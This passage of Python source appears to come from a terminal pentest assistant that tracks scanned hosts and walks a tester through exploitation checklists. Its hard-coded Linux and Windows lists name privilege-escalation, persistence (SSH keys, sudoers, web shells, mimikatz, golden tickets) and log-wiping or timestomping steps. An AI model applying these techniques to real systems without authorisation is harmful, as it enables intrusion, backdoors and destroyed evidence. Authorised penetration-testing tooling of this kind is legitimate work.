              "[Enter] refresh · <n> done · s <n> skip · r <n> run · "
              "[s] status · [f] findings · [b] back · [m] menu",
              lambda: _render_exploit_checklist(ip, target), _handle)


def _exploit_targets_view(ip: str) -> None:
    """Sub-view listing a host's services in exploitation-priority order; a number opens
    that service's pentest checklist."""
    def _handle(targets, v):
        if v == "":
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(targets):
                _exploit_service_view(ip, targets[n - 1])
                return "refresh"
            print(f"{RED}✗ no service {n}{RESET}")
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · enter · b{RESET}")
        return "stay"

    _run_view(f"{ip}/exploit", "[Enter] refresh · <n> select · [b] back · [m] menu",
              lambda: _render_exploit_targets(ip), _handle)


def _handle_service_exploitation() -> None:
    """Phase 6 flow: read a target IP, then show its services (best CTF/OSCP candidates
    first) to pick one to exploit."""
    while True:
        value = _ctx_ask("exploit", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} first{RESET}")
            continue
        _exploit_targets_view(ip)
        return


# ── OS-family checklists: privilege escalation (6) & persistence (7) ───────────
# Both phases key off the host OS, so they share one engine: pick the OS (when none is on
# record), then work a per-family checklist with toggle/skip status. Selectable OSes are
# the ones that keep showing up on HTB / OSCP / CTF; the 2nd field is the checklist family.
_OS_CHOICES = [
    ("Linux",          "linux"),
    ("Ubuntu",         "linux"),
    ("Debian",         "linux"),
    ("Windows",        "windows"),
    ("Windows Server", "windows"),
    ("Other / Unix",   "linux"),
]

# Privesc checklist per OS family (starter methodology — deeper pass later).
_PRIVESC_STEPS = {
    "linux": [
        "Automated enum (linpeas.sh / LinEnum.sh)",
        "sudo -l — sudo rights → GTFOBins",
        "SUID/SGID binaries (find / -perm -4000) → GTFOBins",
        "Capabilities (getcap -r /) → abuse",
        "Cron jobs & writable scripts / PATH hijack",
        "Writable /etc/passwd, /etc/shadow, service files",
        "Kernel version → known exploit (uname -a; searchsploit)",
        "Interesting files: configs, history, SSH keys, backups, .env",
        "Internal services / ports (ss -tlnp) → local exploit",
        "Password reuse & creds in files / process memory",
    ],
    "windows": [
        "Automated enum (winPEAS.exe / PrivescCheck)",
        "whoami /priv — token privileges (SeImpersonate → Potato)",
        "whoami /groups — group memberships",
        "Services: unquoted paths, weak perms, writable binaries",
        "AlwaysInstallElevated (HKLM + HKCU)",
        "Scheduled tasks & startup items with weak perms",
        "Stored creds: cmdkey, registry, Unattend.xml, SAM/SYSTEM",
        "OS build → known exploit (systeminfo; wesng / Sherlock)",
        "Autologon / SNMP / config files with passwords",
        "Token impersonation / named-pipe → SYSTEM",
    ],
}

# Persistence checklist per OS family (maintain access after a foothold / root).
_PERSIST_STEPS = {
    "linux": [
        "Add an SSH key to ~/.ssh/authorized_keys (root & users)",
        "Cron job — user crontab or /etc/cron.d for a callback",
        "systemd service / timer that re-establishes access",
        "New privileged user / add to sudoers (NOPASSWD)",
        "Shell rc backdoor (.bashrc / .profile / /etc/profile.d)",
        "SUID backdoor binary in a stable path",
        "rc.local / init script on boot",
        "PAM / SSH backdoor; capture creds (PAM, keylogger)",
        "Web shell in a served path (if a web app is present)",
        "Note & stash reusable creds for later re-entry",
    ],
    "windows": [
        "Add a local admin / add user to Administrators",
        "Registry Run keys (HKLM & HKCU …\\CurrentVersion\\Run)",
        "Scheduled task (schtasks) for a callback",
        "New service (sc create) running as SYSTEM",
        "Startup folder shortcut",
        "WMI event subscription (fileless)",
        "Accessibility backdoor (sethc / utilman) at logon screen",
        "Enable RDP + user for interactive re-entry",
        "AD: DCSync / golden / silver ticket (domain persistence)",
        "Dump creds (mimikatz) & pass-the-hash for re-entry",
    ],
}

# Covering-tracks checklist per OS family (authorised-engagement cleanup / anti-forensics).
_COVER_STEPS = {
    "linux": [
        "Clear shell history (~/.bash_history, HISTFILE; unset HISTFILE)",
        "Scrub log entries (auth.log, syslog, wtmp/btmp/lastlog)",
        "Timestomp touched files (touch -r reference / -t)",
        "Remove dropped tools, payloads and temp files",
        "Remove artifacts you added (cron/at, keys, users) when done",
        "Clear/limit auditing (auditd rules, .bash_logout)",
        "Close sessions cleanly; note what was changed for the report",
    ],
    "windows": [
        "Clear PowerShell history (ConsoleHost_history.txt)",
        "Clear event logs (wevtutil cl …) — noisy, note it",
        "Timestomp touched files (SetMACE / PowerShell)",
        "Remove dropped tools, payloads and temp artifacts",
        "Delete Prefetch / Recent / Run-MRU traces",
        "Remove added users, tasks and services when done",
        "Note tampered logging (Sysmon/ETW) for the report",
    ],
}


def _os_family(text: "str | None") -> str:
    """Map an OS string (nmap's guess or the user's pick) to a checklist family."""
    return "windows" if text and "windows" in text.lower() else "linux"


def _select_os(ip: str) -> "tuple | None":
    """Prompt for the host OS and remember the choice. Returns (label, family) or None."""
    print(f"\n{BOLD}Select OS for {ip}{RESET}  {DIM}(pick the target's OS){RESET}")
    for i, (label, _fam) in enumerate(_OS_CHOICES, 1):
        print(f"  {CYAN}{i}{RESET} {label}")
    while True:
        v = _ctx_ask("os", f"<1-{len(_OS_CHOICES)}> · [b] back")
        if v is None or v.lower() in _BACK_WORDS:
            return None
        if v.isdigit() and 1 <= int(v) <= len(_OS_CHOICES):
            label, fam = _OS_CHOICES[int(v) - 1]
            save_os(ip, label)                 # remember it on the host record
            return label, fam
        print(f"{RED}✗ pick 1-{len(_OS_CHOICES)}{RESET}")


def _render_os_checklist(ip: str, kind: str, title: str, steps_map: dict,
                         family: str, os_label: str) -> None:
    """One OS-family checklist (privesc / persistence) for a host, by family."""
    steps = steps_map.get(family, steps_map["linux"])
    status = fetch_step_status(ip, 0, "", f"{kind}:{family}")
    print(f"\n{BOLD}{title} — checklist{RESET}  {DIM}{ip} · {os_label}{RESET}")
    print()
    for i, step in enumerate(steps, 1):
        desc, _tool = _step_parts(step)
        st = status.get(i)
        sym, col = _STEP_MARK.get(st, _STEP_MARK[None])
        body = f"{col}{desc}{RESET}" if st in ("done", "skip") else desc
        print(f"  {CYAN}{i:>2}{RESET} {col}{sym}{RESET} {body}")


def _os_checklist_view(ip: str, kind: str, title: str, steps_map: dict,
                       family: str, os_label: str) -> None:
    """Interactive OS-family checklist: <n> done, s <n> skip, o change OS. Status is saved
    (port 0, service '<kind>:<family>') so it survives across sessions."""
    cur = {"family": family, "label": os_label}        # mutable so [o] can switch it live

    def _toggle(n, want):
        steps = steps_map.get(cur["family"], steps_map["linux"])
        if not 1 <= n <= len(steps):
            print(f"{RED}✗ no step {n}{RESET}")
            return
        svc = f"{kind}:{cur['family']}"
        prev = fetch_step_status(ip, 0, "", svc).get(n)
        set_step_status(ip, 0, "", svc, n, None if prev == want else want)

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "o":
            picked = _select_os(ip)                    # also saves the new OS on the host
            if picked:
                cur["label"], cur["family"] = picked
            return "refresh"
        if v.startswith("s") and v[1:].strip().isdigit():
            _toggle(int(v[1:].strip()), "skip")
            return "refresh"
        if v.isdigit():
            _toggle(int(v), "done")
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> done · s <n> skip · o · b{RESET}")
        return "stay"

    _run_view(f"{ip} {kind}",
              "[Enter] refresh · <n> done · s <n> skip · [o] change OS · [b] back · [m] menu",
              lambda: _render_os_checklist(ip, kind, title, steps_map, cur["family"], cur["label"]),
              _handle)


def _os_checklist_for(ip: str, kind: str, title: str, steps_map: dict) -> None:
    """Open an OS-family checklist for a known host: use the OS on record, or ask for it."""
    os_db = fetch_host_os(ip)
    if os_db:
        _os_checklist_view(ip, kind, title, steps_map, _os_family(os_db), os_db)
        return
    picked = _select_os(ip)
    if picked:
        _os_checklist_view(ip, kind, title, steps_map, picked[1], picked[0])


def _os_checklist_progress(ip: str, kind: str, steps_map: dict) -> tuple:
    """(complete, detail) for an OS-family phase in progress. Not started until an OS is on
    record; complete once every step is resolved (done/skip)."""
    os_db = fetch_host_os(ip)
    if not os_db:
        return False, ""
    family = _os_family(os_db)
    steps = steps_map.get(family, steps_map["linux"])
    status = fetch_step_status(ip, 0, "", f"{kind}:{family}")
    n_done = sum(1 for i in range(1, len(steps) + 1) if status.get(i) in ("done", "skip"))
    return n_done == len(steps), f"{n_done}/{len(steps)} steps · {family}"


def _handle_os_checklist(title: str, kind: str, steps_map: dict) -> None:
    """Menu flow for an OS-family phase: read a target IP, then work its checklist."""
    while True:
        value = _ctx_ask(kind, "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        _os_checklist_for(ip, kind, title, steps_map)
        return


def _handle_privesc() -> None:
    _handle_os_checklist("Privilege Escalation", "privesc", _PRIVESC_STEPS)


def _handle_persist() -> None:
    _handle_os_checklist("Persistence", "persist", _PERSIST_STEPS)


def _handle_cover() -> None:
    _handle_os_checklist("Covering Tracks", "cover", _COVER_STEPS)


# ── placeholder handlers (skeleton — nothing is wired yet) ────────────────────
def _todo(title: str) -> None:
    """Uniform 'not implemented yet' notice for a skeleton screen."""
    print(f"\n{MAGENTA}▸ {title}{RESET}")
    print(f"  {YELLOW}[skeleton]{RESET} {DIM}not wired yet — engine coming soon{RESET}")


def run_phase(key: str) -> None:
    name = _PHASES[key][0]
    _todo(name)


# state -> (colour, label) shown in each status row
_STATE_LABEL = {"running": (YELLOW, "running"), "done": (GREEN, "complete"),
                "error": (RED, "error"), "aborted": (MAGENTA, "aborted")}


def _status_groups(jobs: list) -> list:
    """Group jobs of one phase execution (same run id) into one entry — a phase launches
    its parallel commands together, so they share a number and sit beneath each other.
    Each separate execution keeps its own number, even for the same phase re-run."""
    groups: list = []
    index: dict = {}                      # run id -> its group, to keep runs distinct
    for j in jobs:
        run = j.get("run") or f"job{id(j)}"
        if run in index:
            index[run].append(j)
        else:
            g = [j]
            index[run] = g
            groups.append(g)
    return groups


def show_status() -> list:
    """Command history, grouped by phase: each entry shows its number, the phase name,
    the combined state (running/complete/error/aborted) and a short found yes/no; the
    phase's command(s) sit beneath it. Returns the ordered groups so the caller can
    stop / view one by number."""
    with _JOBS_LOCK:
        jobs = list(_JOBS)
    print(f"\n{BOLD}Status{RESET}")
    if not jobs:
        print(f"  {DIM}no commands have run yet{RESET}")
        return []
    groups = _status_groups(jobs)
    for n, g in enumerate(groups, 1):
        title = _PHASES.get(g[0]["phase"], (g[0]["name"],))[0]
        if g[0]["phase"] == "5":                     # name which service is being exploited
            title = f"{title} {DIM}—{RESET}{BOLD} {g[0]['name']}"
        state = _agg_state([j["state"] for j in g])
        colour, text = _STATE_LABEL.get(state, (DIM, state))
        found = f"{GREEN}yes{RESET}" if any(j["hosts"] > 0 for j in g) else f"{DIM}no{RESET}"
        multi = len(g) > 1
        tail = f"  {DIM}·{RESET} {DIM}{len(g)} cmds{RESET}" if multi else ""
        print(f"  {CYAN}{n}{RESET} {BOLD}{title}{RESET}  "
              f"{DIM}·{RESET} {colour}{text}{RESET}  {DIM}·{RESET} found: {found}{tail}")
        for j in g:
            if multi:                                    # per-command state so a partly
                jc, jt = _STATE_LABEL.get(j["state"], (DIM, j["state"]))   # done phase is clear
                print(f"       {jc}{jt:<8}{RESET} {DIM}{j['command']}{RESET}")
            else:
                print(f"       {DIM}{j['command']}{RESET}")
            if j["error"]:
                print(f"       {RED}{j['error']}{RESET}")
    return groups


def _cell(value: "str | None", width: int) -> str:
    """Fit a value into a fixed-width column: '—' when missing, truncated with '…'
    when longer than ``width`` so long vendor/OS/hostname strings can't break the
    table layout."""
    s = value if value else "—"
    return s if len(s) <= width else s[:width - 1] + "…"


def _vwidth(s: str) -> int:
    """Visible width of a string — ANSI colour codes don't count."""
    return len(re.sub(r"\x1b\[[0-9;]*m", "", s))


def _box_table(headers: list, rows: list, aligns: "list | None" = None,
               indent: str = "  ") -> str:
    """Render a box-drawing table. Cells may contain ANSI colour codes — column widths
    and padding use the visible width so the borders stay aligned. ``aligns`` is 'l'/'r'
    per column (default left)."""
    n = len(headers)
    aligns = aligns or ["l"] * n
    w = [_vwidth(h) for h in headers]
    for r in rows:
        for i in range(n):
            w[i] = max(w[i], _vwidth(r[i]) if i < len(r) else 0)

    def pad(s, i):
        gap = " " * max(0, w[i] - _vwidth(s))
        return gap + s if aligns[i] == "r" else s + gap

    bar = f"{DIM}│{RESET}"

    def rule(left, mid, right):
        return f"{indent}{DIM}{left}" + mid.join("─" * (w[i] + 2) for i in range(n)) + f"{right}{RESET}"

    out = [rule("┌", "┬", "┐"),
           indent + bar + bar.join(f" {BOLD}{pad(headers[i], i)}{RESET} " for i in range(n)) + bar,
           rule("├", "┼", "┤")]
    for r in rows:
        out.append(indent + bar + bar.join(f" {pad(r[i] if i < len(r) else '', i)} " for i in range(n)) + bar)
    out.append(rule("└", "┴", "┘"))
    return "\n".join(out)


def show_database() -> list:
    """Discovered hosts: IP / MAC / vendor / OS / hostname where known. Long values
    are truncated so the table stays aligned. Returns the ordered rows so the caller
    can delete one by its number."""
    rows = fetch_hosts()
    print(f"\n{BOLD}Database — hosts{RESET}")
    if not rows:
        print(f"  {DIM}empty — no hosts discovered yet{RESET}")
        return rows
    trows = [[str(i), ip or "—", _cell(mac, 17), _cell(vendor, 16), _cell(os_, 20),
              _cell(hostname, 24), str(nports) if nports else "—"]
             for i, (ip, mac, vendor, hostname, os_, nports) in enumerate(rows, 1)]
    print(_box_table(["#", "IP", "MAC", "VENDOR", "OS", "HOSTNAME", "PORTS"], trows,
                     aligns=["r", "l", "l", "l", "l", "l", "r"]))
    return rows


def _delete_host(rows: list, n: int) -> None:
    """Remove one host (by its list number) and everything tied to it — ports, services,
    scripts, vulns and its command-history jobs — from the database."""
    if not 1 <= n <= len(rows):
        print(f"{RED}✗ no host {n}{RESET}")
        return
    ip = rows[n - 1][0]
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for table in ("hosts", "ports", "services", "scripts", "vulns", "exploit_steps", "hostnames"):
                conn.execute(f"DELETE FROM {table} WHERE ip = ?", (ip,))
            conn.commit()
        finally:
            conn.close()
    # also drop this host's command history: jobs that name the IP as a whole token
    # (subnet-discovery jobs don't match, so a shared scope scan is left intact).
    pat = re.compile(r"(?<!\d)" + re.escape(ip) + r"(?!\d)")
    with _JOBS_LOCK:
        gone = [j for j in _JOBS
                if pat.search(j.get("command") or "") or pat.search(j.get("name") or "")]
        gone_ids = {id(j) for j in gone}
        for j in gone:
            if j["state"] == "running":
                j["cancel"].set()             # stop any in-flight scan for this host
        _JOBS[:] = [j for j in _JOBS if id(j) not in gone_ids]
        for j in _JOBS:                       # discovery jobs must forget this host too,
            j["found"].discard(ip)            # or progress would still credit phase 1
    ids = [(j["db_id"],) for j in gone if j.get("db_id") is not None]
    if ids:
        with _DB_LOCK:
            conn = _db_connect()
            try:
                conn.executemany("DELETE FROM jobs WHERE id = ?", ids)
                conn.commit()
            finally:
                conn.close()
    tail = f" {DIM}(+{len(gone)} history entr{'y' if len(gone) == 1 else 'ies'}){RESET}" if gone else ""
    print(f"{GREEN}✓ removed {ip}{RESET}{tail}")


def _render_host_ports(ip: str) -> list:
    """Print one host's numbered open ports / protocol / state / service / version
    (plus its OS when detected). Returns the ordered ports so the caller can open a
    port's NSE (-sC) output by number."""
    ports = fetch_ports(ip)
    services = fetch_services(ip)
    os_ = fetch_host_os(ip)
    head = f"\n{BOLD}{ip} — ports{RESET}"
    if os_:
        head += f"  {DIM}· OS:{RESET} {os_}"
    print(head)
    if not ports:
        print(f"  {DIM}none{RESET}")
        return ports
    vulns = fetch_vulns(ip)
    flagged = {(v[0], v[1]) for v in vulns}          # (port, proto) with a finding
    scripted = fetch_scripted_ports(ip)              # (port, proto) that have script output
    trows = []
    for i, (port, proto, state) in enumerate(ports, 1):
        name, product, version, _cpe = services.get((port, proto), (None, None, None, None))
        ver = " ".join(x for x in (product, version) if x) or "—"
        verlen = 48 if (port, proto) in flagged else 28   # ports with findings show fuller VERSION
        more = "›" if (port, proto) in scripted else "—"  # is there more to see for this port?
        trows.append([str(i), str(port), proto, state or "—",
                      _cell(name, 15), _cell(ver, verlen), more])
    print(_box_table(["#", "PORT", "PROTO", "STATE", "SERVICE", "VERSION", "MORE"], trows,
                     aligns=["r", "r", "l", "l", "l", "l", "l"]))
    return ports


def _render_host_findings(ip: str) -> None:
    """The host's findings, opened with [f]: short one-line summaries — the FINDINGS list
    (incl. phase-4 vuln and phase-6 tool results) and the aggregated CVE list — plus the
    raw host-level NSE output (HOST FINDINGS). Per-port tool output lives in each port's
    DETAILS view, not here."""
    _sync_hosts_block(ip)     # viewing a host's findings as root materialises its DB domains → hosts
    vulns = fetch_vulns(ip)
    host_scripts = fetch_scripts(ip, 0, "")
    hostnames = fetch_hostnames(ip)
    # short summaries: everything except the CVE-lookup rows (those get their own section)
    findings = [v for v in vulns if v[3] != "CVE"]
    cve_map = {}                                     # CVE → set of "port/proto" it was seen on
    for port, proto, _script, _state, cve, _risk, _summary in vulns:
        for c in (cve or "").split(","):
            c = c.strip()
            if c:
                cve_map.setdefault(c, set()).add(f"{port}/{proto}")

    print(f"\n{BOLD}{ip} — findings{RESET}")
    if not findings and not cve_map and not host_scripts and not hostnames:
        print(f"  {DIM}none{RESET}")
        return
    if hostnames:
        note = ("auto-synced to /etc/hosts (removed on exit)" if _is_root()
                else "no sudo — not in /etc/hosts; paste the line below")
        print(f"\n  {BOLD}HOSTNAMES{RESET}  {DIM}({note}){RESET}")
        for hn, _port, source in hostnames:
            print(f"    {CYAN}{hn}{RESET}  {DIM}{source}{RESET}")
        if not _is_root():
            snip = _hosts_snippet(ip)
            if snip:
                print(f"    {DIM}$ {snip}{RESET}")
    if findings:
        print(f"\n  {BOLD}FINDINGS{RESET}")
        for port, proto, script, state, cve, risk, summary in findings:
            col = RED if state in ("VULNERABLE", "LIKELY") else \
                (YELLOW if state == "EXPOSED" else DIM)
            print(f"    {col}{state:<11}{RESET}{port}/{proto:<5}"
                  f"{_cell(summary or script, 60)}")
    if cve_map:
        kev = _load_kev()
        ordered = sorted(cve_map, key=_cve_sort_key)     # newest first
        kev_hits = [c for c in ordered if c in kev]
        rest = [c for c in ordered if c not in kev]
        print(f"\n  {BOLD}CVE{RESET}")

        def _group(title, cves, col):
            print(f"    {title}")
            if cves:
                for c in cves:
                    print(f"      {col}{c}{RESET}  {DIM}{', '.join(sorted(cve_map[c]))}{RESET}")
            else:
                print(f"      {DIM}none{RESET}")

        _group(f"{BOLD}⚑ KEV CVE — known exploited{RESET}", kev_hits, RED)   # header neutral, CVEs red
        _group(f"{BOLD}other CVE{RESET}", rest, DIM)                          # rest → grey
    if host_scripts:
        print(f"\n  {BOLD}HOST FINDINGS{RESET}")
        for script, output in host_scripts:
            print(f"    {CYAN}{script}{RESET}")
            for line in (output or "").strip().split("\n"):
                print(f"        {line.rstrip()}")


def _render_port_scripts(ip: str, port: int, proto: str) -> None:
    """Print the full collected output for one port — every tool's raw result: service
    detection (-sC), the vuln scan (phase 4) and service exploitation (phase 6). The short
    one-line takeaways are summarised separately in [f] findings, not repeated here."""
    rows = fetch_scripts(ip, port, proto)          # all tools' output stored for this port
    print(f"\n{BOLD}{ip}:{port}/{proto} — DETAILS{RESET}")
    if not rows:
        print(f"  {DIM}None{RESET}")
        return
    for script, output in rows:
        print(f"  {CYAN}{script}{RESET}")
        for line in (output or "").strip().split("\n"):
            print(f"      {line.rstrip()}")


def _port_scripts_view(ip: str, ports: list, n: int) -> None:
    """Sub-view for one port's -sC output: stays open (the ports table is NOT redrawn)
    until the user goes back."""
    if not 1 <= n <= len(ports):
        print(f"{RED}✗ no port {n}{RESET}")
        return
    port, proto, _state = ports[n - 1]

    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "f":
            _host_findings_view(ip)
            return "refresh"
        if v == "p":
            _open_host_progress(ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— f · p · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}:{port}/{proto}",
              "[Enter] refresh · [f] findings · [p] progress · [b] back · [m] menu",
              lambda: _render_port_scripts(ip, port, proto), _handle)


def _host_findings_view(ip: str) -> None:
    """Sub-view for one host's findings, opened with [f]; [p] jumps to its progress. Stays
    open (the ports table is NOT redrawn) until the user goes back."""
    def _handle(_c, v):
        if v == "":
            return "refresh"
        if v == "p":
            _open_host_progress(ip)
            return "refresh"
        print(f"{RED}✗ unknown option{RESET} {DIM}— p · b · enter{RESET}")
        return "stay"

    _run_view(f"{ip}/findings", "[Enter] refresh · [p] progress · [b] back · [m] menu",
              lambda: _render_host_findings(ip), _handle)


def _host_ports_view(rows: list, n: int) -> None:
    """Sub-view for one host's ports: stays open (the host list is NOT redrawn) until the
    user goes back. A port number opens its -sC output; [f]/[p] jump to findings/progress."""
    if not 1 <= n <= len(rows):
        print(f"{RED}✗ no host {n}{RESET}")
        return
    ip = rows[n - 1][0]

    def _handle(ports, v):
        if v == "":
            return "refresh"
        if v.lower() == "f":
            _host_findings_view(ip)
            return "refresh"
        if v.lower() == "p":
            _open_host_progress(ip)
            return "refresh"
        if v.isdigit():
            n = int(v)
            if 1 <= n <= len(ports):
                _port_scripts_view(ip, ports, n)
                return "refresh"
            print(f"{RED}✗ no port {n}{RESET}")     # bad number → bare re-prompt, no redraw
            return "stay"
        print(f"{RED}✗ unknown option{RESET} {DIM}— <n> · f · p · b · enter{RESET}")
        return "stay"

    _run_view(ip, "[Enter] refresh · <n> select · [f] findings · [p] progress · [b] back · [m] menu",
              lambda: _render_host_ports(ip), _handle)


def clear_database() -> None:
    """Wipe all discovered hosts (and their ports/services) after confirmation."""
    if not os.path.exists(DB_PATH):
        print(f"\n{DIM}database already empty{RESET}")
        return
    ans = _ask("clear ALL discovered hosts (+ ports/services)? [y/N]:")
    if ans is None or ans.lower() != "y":
        print(f"{DIM}cancelled{RESET}")
        return
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for table in ("hosts", "ports", "services", "scripts", "vulns", "exploit_steps", "hostnames"):
                conn.execute(f"DELETE FROM {table}")
            conn.commit()
        finally:
            conn.close()
    print(f"{GREEN}✓ database cleared{RESET}")


def new_session() -> None:
    """Start a fresh session: abort any running scan and wipe the whole database —
    discovered hosts and the command history alike."""
    if not os.path.exists(DB_PATH) and not _JOBS:
        print(f"\n{DIM}already a clean session{RESET}")
        return
    ans = _ask("start a NEW session — wipe ALL data (hosts + history)? [y/N]:")
    if ans is None or ans.lower() != "y":
        print(f"{DIM}cancelled{RESET}")
        return
    with _JOBS_LOCK:
        for j in _JOBS:                   # stop anything still running
            if j["state"] == "running":
                j["cancel"].set()
        _JOBS.clear()
    if os.path.exists(DB_PATH):
        with _DB_LOCK:
            conn = _db_connect()
            try:
                for table in ("hosts", "jobs", "ports", "services", "scripts", "vulns",
                              "exploit_steps", "hostnames"):
                    conn.execute(f"DELETE FROM {table}")
                conn.commit()
            finally:
                conn.close()
    print(f"{GREEN}✓ new session — database cleared{RESET}")


def _upgrade_to_root() -> None:
    """Re-launch pshunter under sudo so SYN/UDP scans get raw-socket privileges. sudo
    itself handles the password (we never see it); progress lives in the DB, so the
    fresh root instance reloads everything. If the password prompt is cancelled we stay
    in the current (unprivileged) session."""
    if _is_root():
        print(f"\n{GREEN}already running as root{RESET}")
        return
    if not shutil.which("sudo"):
        print(f"\n{RED}✗ sudo not found — start it yourself with: sudo pshunter{RESET}")
        return
    running = any(j["state"] == "running" for j in _JOBS)
    note = " (running scans will restart)" if running else ""
    print(f"\n{BOLD}Upgrade to root{RESET}{DIM} — enter your sudo password when asked; "
          f"progress is saved in the database{note}.{RESET}")
    try:
        rc = subprocess.call(["sudo", "-v"])          # prompts on the tty, caches creds
    except OSError as exc:
        print(f"{RED}✗ could not run sudo: {exc}{RESET}")
        return
    if rc != 0:
        print(f"{DIM}upgrade cancelled — still running as a normal user{RESET}")
        return
    # Credentials cached: replace this process with a root one (no second prompt). Keep
    # PURRSH_TERM_ID so the in-app report spawn keeps working after the upgrade.
    print(f"{GREEN}▶ re-launching as root…{RESET}")
    sys.stdout.flush()
    script = os.path.abspath(__file__)
    try:
        os.execvp("sudo", ["sudo", "-n", "--preserve-env=PURRSH_TERM_ID",
                           sys.executable, script])
    except OSError as exc:
        print(f"{RED}✗ re-launch failed: {exc}{RESET}")


def _stop_job(groups: list, n: int) -> None:
    """Signal a running phase (by its status number) to abort — every still-running
    command in the group is killed within a tick; whatever each found so far is kept."""
    if not 1 <= n <= len(groups):
        print(f"{RED}✗ no scan {n}{RESET}")
        return
    grp = groups[n - 1]
    running = [j for j in grp if j["state"] == "running"]
    if not running:
        print(f"{DIM}{n} already {_agg_state([j['state'] for j in grp])}{RESET}")
        return
    for j in running:
        j["cancel"].set()
    print(f"{YELLOW}aborting {n}…{RESET}")


# External terminal emulators tried, in order, for the standalone spawn. The second
# item is the argv that precedes the program to run inside them ("-e" for most,
# "--" for gnome-terminal, "-x" for xfce4-terminal, nothing for kitty).
_TERM_EMULATORS = [
    ("x-terminal-emulator", ["-e"]), ("qterminal", ["-e"]), ("konsole", ["-e"]),
    ("xfce4-terminal", ["-x"]), ("gnome-terminal", ["--"]), ("tilix", ["-e"]),
    ("alacritty", ["-e"]), ("kitty", []), ("xterm", ["-e"]),
]


def _render_report_session(command: str, output: "str | None") -> str:
    """Build the coloured replay text: stock-Kali prompt (frame green/non-bold,
    user㉿host and $ bold-blue, ~ white) + greenish first command word (rest plain)
    + plain output. Kept in sync with the host app's in-tab renderer so both spawn
    paths look identical."""
    E = "\033"
    # cmd1 is the turquoise from QTermWidget's "Linux" scheme (Color6 = 24,178,178),
    # as 24-bit truecolor so the shade is stable across themes.
    grn, bblu, cmd1, wht, rs = (f"{E}[32m", f"{E}[1;34m", f"{E}[38;2;24;178;178m",
                                f"{E}[1;37m", f"{E}[0m")
    import getpass
    import socket
    try:
        user, host = getpass.getuser(), socket.gethostname()
    except Exception:
        user, host = "kali", "kali"
    first, _, rest = command.partition(" ")
    cmd = f"{cmd1}{first}{rs}" + (f" {rest}" if rest else "")
    prompt = (f"{grn}┌──({bblu}{user}㉿{host}{rs}{grn})-[{wht}~{rs}{grn}]{rs}\n"
              f"{grn}└─{bblu}${rs} {cmd}")
    return f"{prompt}\n{output or '(no output captured)'}\n"


def _spawn_report_in_app(job_id: int) -> None:
    """In-app path: emit an OSC 777 marker carrying only the job id. The PurrSh3ll
    host app parses it, reads the command/output from pshunter.db itself and opens
    a QTermWidget tab — so a scanned host cannot forge a command into this channel."""
    sys.stdout.write(f"\033]777;psspawn;{int(job_id)}\007")
    sys.stdout.flush()


def _spawn_report_standalone(job: dict) -> None:
    """Standalone path: render the replay ourselves and open it in an external
    terminal emulator (self-deleting temp file). Falls back to printing inline in the
    current terminal when there is no display or no emulator (e.g. over SSH)."""
    session = _render_report_session(job.get("command", ""), job.get("output"))
    term = next(((shutil.which(b), flag) for b, flag in _TERM_EMULATORS if shutil.which(b)),
                (None, None))
    have_display = os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")
    if not have_display or not term[0]:
        print()                                   # headless fallback: show it here
        sys.stdout.write(session)
        sys.stdout.flush()
        return
    binary, flag = term
    fd, path = tempfile.mkstemp(prefix="pshunter_report_", suffix=".txt")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(session)
        q = shlex.quote(path)
        script = f"clear; cat {q}; rm -f {q}; exec ${{SHELL:-/bin/bash}}"
        subprocess.Popen([binary] + flag + ["sh", "-c", script],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         stdin=subprocess.DEVNULL, start_new_session=True)
        print(f"{GREEN}opened scan output in a new terminal window{RESET}")
    except Exception as exc:
        _safe_unlink(path)
        print(f"{RED}✗ could not open a terminal: {exc}{RESET}")


def _view_command(groups: list, n: int) -> None:
    """Show phase n's command(s) + output in a spawned terminal (variant B) — via the
    PurrSh3ll host app when running inside it, or an external terminal standalone. A phase
    with several commands opens one terminal per finished command."""
    if not 1 <= n <= len(groups):
        print(f"{RED}✗ no scan {n}{RESET}")
        return
    viewable = [j for j in groups[n - 1]
                if j.get("db_id") is not None and j["state"] != "running"]
    if not viewable:
        print(f"{DIM}scan {n} — no captured output yet{RESET}")
        return
    if os.environ.get("PURRSH_TERM_ID"):
        for j in viewable:
            _spawn_report_in_app(j["db_id"])
        note = f" ({len(viewable)} cmds)" if len(viewable) > 1 else ""
        print(f"{GREEN}opened scan {n} output{note} in a new terminal{RESET}")
    else:
        for j in viewable:
            _spawn_report_standalone(j)


def _clear_status() -> None:
    """Drop finished commands from the history (in memory and in the DB); running
    scans are kept so they can still be watched or stopped."""
    with _JOBS_LOCK:
        kept = [j for j in _JOBS if j["state"] == "running"]
        removed = [j for j in _JOBS if j["state"] != "running"]
        _JOBS[:] = kept
    ids = [(j["db_id"],) for j in removed if j.get("db_id") is not None]
    if ids:
        with _DB_LOCK:
            conn = _db_connect()
            try:
                conn.executemany("DELETE FROM jobs WHERE id = ?", ids)
                conn.commit()
            finally:
                conn.close()
    print(f"{GREEN}✓ cleared {len(removed)} finished command(s){RESET}")


# ── action views (stay open until the user goes back) ─────────────────────────
def _run_view(module: str, options: str, render, handle=None) -> None:
    """Keep an interactive screen open. ``render()`` draws the content and may return a
